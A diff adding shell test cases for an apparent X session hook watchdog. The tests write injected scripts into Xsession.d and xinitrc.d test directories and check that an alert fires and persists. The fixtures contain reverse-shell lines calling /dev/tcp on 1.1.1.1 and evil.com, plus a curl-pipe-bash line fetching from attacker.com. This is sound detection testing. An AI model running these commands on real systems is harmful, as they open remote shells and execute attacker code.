@@ -186,3 +186,46 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-xsession -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): xsession-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/90benign"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"xsession_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# 90benign\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport LANG="$LANG"\n' > "${HOOKD}/90benign"
+    run_wd
+    ! cap | grep -q '"event":"xsession_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/X11/Xsession.d + /etc/X11/xinit/xinitrc.d axes — injection in ANY → alert)" {
+    # The display manager sources from Xsession.d (X session start) and
+    # xinit/xinitrc.d (xinit-based session start). Lock multi-dir axis.
+    HOOKD2="${TMP}/xinitrc.d"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-xinit"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/90benign"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
